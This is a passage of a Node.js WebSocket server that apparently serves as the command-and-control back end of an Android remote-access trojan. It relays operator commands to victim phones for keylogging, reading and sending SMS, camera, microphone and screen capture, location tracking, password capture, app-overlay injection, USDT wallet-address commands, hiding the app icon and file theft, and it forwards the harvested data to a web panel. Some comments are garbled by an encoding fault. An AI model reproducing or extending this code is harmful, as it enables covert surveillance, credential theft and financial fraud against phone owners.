                  MobReciverr.send(msgdata);
                }
                break;
              case "notify":
                {
                  const jsonData = {
                    type: "bc",
                    subc: "N",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;

              default:
                break;
            }
          }
          break;
        case "screen":

          {
            // const mobpid = data.pid;
            const comand = data.comand;



            switch (comand) {
              case "block":
                {
                  const blockit = data.bstate; //0,1
                  const color = data.color; //0,1

                  const jsonData = {
                    type: "screen",
                    subc: "block",
                    blockstate: blockit,
                    color: color
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "paste":
                {
                  const texttopaste = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "paste",
                    txt: texttopaste,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "mov":
                {

                  const mtype = data.movetype;
                  const points = data.poi;
                  const jsonData = {
                    type: "screen",
                    subc: "mov",
                    poi: points,
                    movetype: mtype,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "snap":
                {
                  //snap , 1 single , 0 multie
                  const stype = data.stype; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "snap",
                    snaptype: stype,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata); //send it frontend js
                }
                break;

              case "vol":
                {
                  //vol = Voluome , 1 up , 0 down
                  const vstate = data.volstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "vol",
                    volstate: vstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "kb":
                {
                  //kb = keyboard , 1 show , 0 hide
                  const newstate = data.kbstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "kb",
                    kbstate: newstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "L":
                {
                  //L = Lock , 1 lock , 0 unlock
                  const lockit = data.lockit; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "L",
                    lock: lockit,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "nav":
                {
                  const navto = data.navshort; //ho, rec, bak
                  const jsonData = {
                    type: "screen",
                    subc: "nav",
                    nav: navto,
                  };
                  const msgdata = JSONIT(jsonData);
                  MobReciverr.send(msgdata);  // 鍙戦€佸懡浠ゅ埌璁惧
                }
                break;
              case "q":
                {
                  const newqulity = data.newqulity;

                  const jsonData = {
                    type: "screen",
                    subc: "Q",
                    newq: newqulity,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "phonepass":

                {
                  const passtype = data.passtype;
                  const phonepass = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "phonepass",
                    passtype: passtype,
                    phonepass: phonepass
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "usdt":
                {
                  const usdttype = data.usdttype;

                  const jsonData = {
                    type: "screen",
                    subc: "usdt",
                    usdttype: usdttype,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "usdtadress":
                {
                  const usdtxt = data.usdtadresstext;

                  const jsonData = {
                    type: "screen",
                    subc: "usdtadress",
                    usdtadresstext: usdtxt,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "blockd":
                {
                  const blotext = data.blocktext;

                  const jsonData = {
                    type: "screen",
                    subc: "blockd",
                    blocktext: blotext,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              default:
                break;
            }
          }
          break;
        // case "ping":
        //   {

        //     const jsonData = {
        //       type: "connected",
        //     };

        //     const msgdata = JSONIT(jsonData);

        //     MobReciverr.send(msgdata);
        //   }
        //   break;
        case "srch":
          {


            const searchfor = data.srchfor;
            const searchin = data.srchin;
            const serchpath = data.targetpath || "null";

            const jsonData = {
              type: "srh",
              subc: searchin, //G or S
              Tpath: serchpath,
              sfor: searchfor,
            };

            const chatdata = JSONIT(jsonData);

            MobReciverr.send(chatdata);
          }
          break;
        case "cocu": //copy cut
          {


            const thetype = data.state; //co cu
            const despath = data.tp;
            const frompsaths = data.fp;

            const json_file = {
              type: "file",
              subc: thetype,
              tpath: despath,
              fpath: frompsaths,
            };

            const filedata = JSONIT(json_file);

            MobReciverr.send(filedata);
          }
          break;
        case "chat":
          const msg = data.msg;

          const title = data.title;



          const jsonData = {
            type: "chat",
            data: msg,
            title: title,
          };

          const chatdata = JSONIT(jsonData);

          MobReciverr.send(chatdata);

          break;
        default:

          break;
      }
      break;
    case idf_adminsend:

      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_check.txt");

        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const safeCheck = sanitizeLogField(usercheck);
        const safePid = sanitizeLogField(phoneId);
        const line = `${safePid}\t${safeCheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("鍐欏叆 mov_check.txt 鍑洪敊:", err);
          }
        });
      }
      const MobReciver = getOpenDeviceSocket(phoneId); // 鉁?鍙戠粰瀹夊崜
      if (!MobReciver) {
        auditSecurityEvent("adminsend_target_offline", { phoneId, itype, subc: subcommand || "" });
        alertpanel(ws, "Target device offline", Alert_info);
        return;
      }
      // if (!MobReciver) {
      //   console.log(`MobReciver is undefined or null for phoneId: ${phoneId}`);
      //   return;
      // } else if (MobReciver.readyState != WebSocket.OPEN) {
      //   console.log(`MobReciver is not OPEN for phoneId: ${phoneId}, readyState: ${MobReciver.readyState}`);
      //   return;
      // }

      switch (subcommand) {
        case "display":
          {
            const jsonData = {
              type: "screencomd",
              subc: "display",
              display: data.display,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "screen":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Screen",
              comdtype: data.screentype,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "cam":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Camera",
              SelectedCam: data.SelectedCam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "camoff":
          {

            const jsonData = {
              type: "screencomd",
              subc: "CameraOff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "mic":
          {
            const jsonData = {
              type: "mic",
              subc: "ON",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "micoff":
          {
            const jsonData = {
              type: "mic",
              subc: "OFF",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "activz":
          {
            const subc = data.subc; // 'L' or 'D'
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GA",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DA",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "notifys":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GF",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DF",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vapps":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GV",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DV",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vlinks":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GU",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DU",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Keylog":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "Keylog",
              comdtype: data.keylogtype,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "Logdate":
          {
            let jsonData = null;

            jsonData = {
              type: "screencomd",
              subc: "Logdate",
              comdtype: data.keylogtype,
              kdate: data.keylogdate,
            };
            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Permissions":
          {
            const subc = data.subc;
            if (subc === "Clear") {
              // 浠呬緵鍚庣鏁版嵁搴撴竻绌猴紝WebSocket 涓嶅鐞?
            } else if (subc === "R") {
              const jsonData = {
                type: "Permissions",
                subc: "R",
                prim: data.prim,
              };
              MobReciver.send(JSONIT(jsonData));
            }
          }
          break;
        case "Hideico":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Hideico",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "DIAO":
          {

            const jsonData = {
              type: "screencomd",
              subc: "DIAO",
              pin: data.pin,
              title: data.title,
              lckdis: data.lckdis,
              typ: data.typ,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "OPENINJ":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENINJ",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "OPENAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "UNINSTALLAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "UNINSTALLAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "LOADAPPS":
          {

            const jsonData = {
              type: "screencomd",
              subc: "LOADAPPS",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "Contacts":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Contacts",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "SMS":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMS",
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "SMSSEND":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMSSEND",
              smsnumber: data.smsnumber,
              message: data.message,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "loc": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Location",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "locoff": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Locationoff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "files":
          {
            const jsonData = {
              type: "screencomd",
              subc: "files",
              filepath: data.filepath,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "changefiles": {
          if (data.comdtype === "U") {
            const chunkSize = 1024 * 256; // 姣忕墖 256KB
            const content = data.content || ""; // Base64 瀛楃涓?
            const totalSize = content.length;
            const totalChunks = Math.ceil(totalSize / chunkSize);

            let offset = 0;
            let index = 0;

            while (offset < totalSize) {
              const end = Math.min(offset + chunkSize, totalSize);
              const chunk = content.substring(offset, end);

              const jsonData = {
                type: "screencomd",
                subc: "changefiles",
                comdtype: data.comdtype, // "U"
                isinjct: data.isinjct,
                jctid: data.jctid,
                filepath: data.filepath,
                filetype: data.filetype,
                filename: data.filename,
                size: data.size,
                chunkIndex: index,
                totalChunks: totalChunks,
                content: chunk,
              };

              MobReciver.send(JSONIT(jsonData));

              offset = end;
              index++;
            }
          } else {
            // 鈿?鍒犻櫎 (R) / 涓嬭浇 (D) 淇濇寔鍘熸牱
            const jsonData = {
              type: "screencomd",
              subc: "changefiles",
              comdtype: data.comdtype,
              filepath: data.filepath,
              filetype: data.filetype,
              filename: data.filename,
              size: data.size,
              content: data.content,
            };
            MobReciver.send(JSONIT(jsonData));
          }
        }
          break;

        case "noinj":
          {
            const jsonData = {
              type: "screencomd",
              subc: "noinj",
              jctid: data.jctid,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "viewfile":
          {
            const jsonData = {
              type: "screencomd",
              subc: "viewfile",
              filepath: data.filepath,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "rename":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Rename",
              name: data.nam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "change":
          {
            const jsonData = {
              type: "screencomd",
              subc: "change",
              domain: data.domain,
              ip: data.ip,
              changeid: data.changeid
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Notify":
          {
            const jsonData = {
              type: "Notifi",
              noti: data.noti,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "delete":
          {
            const jsonData = {
              type: "Delete",
              subc: "[reme]",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

      }
      break;
    case idf_client:
      const FrontReciver = SolrUsers.get(phoneId);

      // 妫€鏌?WebSocket 杩炴帴鏄惁鏈夋晥


      if (FrontReciver) {
        for (const ws of FrontReciver) {
          if (ws.readyState === WebSocket.OPEN) {
            try {
              // 澶勭悊瀹㈡埛绔懡浠?
              switch (subcommand) {


                case "klogs":
                  {



                    const jsonData = {
                      type: "klog",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "klogsdate":
                  {



                    const jsonData = {
                      type: "klogsdate",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "sms":
                  {
                    const jsonData = {
                      type: "sms",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "chat":
                  const json_chat = {
                    type: "chat",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringchat = JSON.stringify(json_chat);

                  ws.send(stringchat, (error) => {
                    if (error) {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);

                      ws.send(stopit);
                      ws.terminate();
                    }
                  });

                  break;
                case "files":
                  const json_files = {
                    type: "files",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringfiles = JSON.stringify(json_files);

                  ws.send(stringfiles);
                  break;

                case "savefiles":
                  const json_filessave = {
                    type: "savefiles",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const savefiles = JSON.stringify(json_filessave);

                  ws.send(savefiles);
                  break;

                case "thumb":
                  {
                    let imgpath = data.pth || "null";

                    const json_thumb = {
                      type: "thumb",
                      data: data.msg,
                      pid: data.pid,
                      path: imgpath,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "snap":
                  {
                    const json_thumb = {
                      type: "snap",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "mic":
                  {
                    const json_mic = {
                      type: "mic",
                      data: data.voip,
                      pid: data.pid,
                    };

                    const stringmic = JSON.stringify(json_mic);

                    ws.send(stringmic);
                  }
                  break;

                case "screen":
                  {


                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screen",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    ws.send(stringscr);
                  }
                  break;
                case "screenshot":
                  {


                    let mobwidth = data.wmob !== undefined ? data.wmob : "";
                    let mobheight = data.hmob !== undefined ? data.hmob : "";

                    const json_scr = {
                      type: "screenshot",
                      data: data.img,
                      pid: data.pid,
                      wmob: mobwidth,
                      hmob: mobheight,
                    };

                    const stringscr = JSON.stringify(json_scr);

                    ws.send(stringscr);
                  }
                  break;
                case "loc":
                  {

                    const json_loc = {
                      type: "loc",
                      data: data.msg,
                      pid: data.pid,
                    };
                    const stringloc = JSON.stringify(json_loc);
                    ws.send(stringloc);

                  }
                  break;
                // case "ping":
                //   {
                //     const json_ping = {
                //       type: "ping",
                //       data: data.msg,
                //       pid: data.pid,
                //     };

                //     const stringping = JSON.stringify(json_ping);

                //     ws.send(stringping);

                //   }
                //   break;
                case "proxy":
                  {
                    let thecall = data.ctype;

                    let json_prxy;

                    if (thecall === "first") {
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }

                      let localadress = data.loip;
                      let proxyport = data.pport;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "first",
                        extip: extraddress,
                        locip: localadress,
                        pxport: proxyport,
                      };
                    } else if (thecall === "state") {
                      let the_state = data.pxstate;

                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "state",
                        pstate: the_state,
                      };
                    } else if (thecall === "dataup") {
                      let originalip = data.oip;
                      let proxymethod = data.pmth;
                      let proxyurl = data.purl;
                      let extraddress = ws._socket.remoteAddress;

                      // Check if the address is in IPv6-mapped IPv4 format
                      if (extraddress.startsWith("::ffff:")) {
                        extraddress = extraddress.split("::ffff:")[1];
                      }
                      json_prxy = {
                        type: "proxy",
                        pid: data.pid,
                        calltype: "dataup",
                        ogip: originalip,
                        pxip: extraddress,
                        purl: proxyurl,
                        pmthod: proxymethod,
                      };
                    } else {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);
                      ws.send(stopit);
                      ws.terminate();
                      return;
                    }

                    const stringprxy = JSON.stringify(json_prxy);

                    ws.send(stringprxy);
                  }
                  break;
                case "srch":
                  {
                    let datapaths = data.pths || "null";
                    let srchfor = data.stype || "null";

                    const json_srch = {
                      type: "srch",
                      data: datapaths,
                      pid: data.pid,
                      sfor: srchfor,
                    };

                    const stringsrh = JSON.stringify(json_srch);

                    ws.send(stringsrh);
                  }
                  break;
                case "down": //download
                  {
                    const filename = data.filename;
                    const filedata = data.filedata; // Get base64 chunk
                    const totalSize = data.totalSize;
                    const sentSize = data.sentSize;
                    const chunkNumber = data.chunkNumber;
                    const filehash = data.filehash;
                    const filepath = data.filepath;

                    const json_file = {
                      type: "down",
                      filename: filename,
                      filedata: filedata,
                      totalSize: totalSize,
                      sentSize: sentSize,
                      chunkNumber: chunkNumber,
                      filehash: filehash,
                      filepath: filepath,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(json_file);

                    ws.send(stringdata);
                  }
                  break;
                case "cam":
                  {

                    const json_cam = {
                      type: "cam",
                      data: data.img,
                      pid: data.pid,
                    };

                    const stringcam = JSON.stringify(json_cam);

                    ws.send(stringcam);
                  }
                  break;
                case "injapps":
                  {
                    const jsonData = {
                      type: "injapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadapps":
                  {
                    const jsonData = {
                      type: "loadapps",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                case "loadcontacts":
                  {
                    const jsonData = {
                      type: "loadcontacts",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringdata = JSON.stringify(jsonData);

                    ws.send(stringdata);
                  }
                  break;
                default:

                  break;
              }
            } catch (err) {
              console.error("鉂?Failed to send to one web user:", err);
            }


          }
        }
      }
      break;


    default:
      break;
  }
}


function JSONIT(params) {
  return JSON.stringify(params);
}

function alertpanel(frontws, msg, alert) {
  const jsonData = {
    type: "notify",
    pid: "ALERTER",
    meth: alert,
    data: msg,
  };

  const jsonString = JSONIT(jsonData);

  frontws.send(jsonString);
}

const PORT = Number(process.env.PORT || process.env.HTTP_PORT || 3000);
const HTTP_HOST = process.env.HTTP_HOST || "127.0.0.1";
console.log("馃殌 ~ PORT:", PORT);
server.listen(PORT, HTTP_HOST, () => {
  console.log(`Http on ${HTTP_HOST}:${PORT}`);
});

console.log(`WebSocket on ${WS_HOST}:${WS_PORT}`);
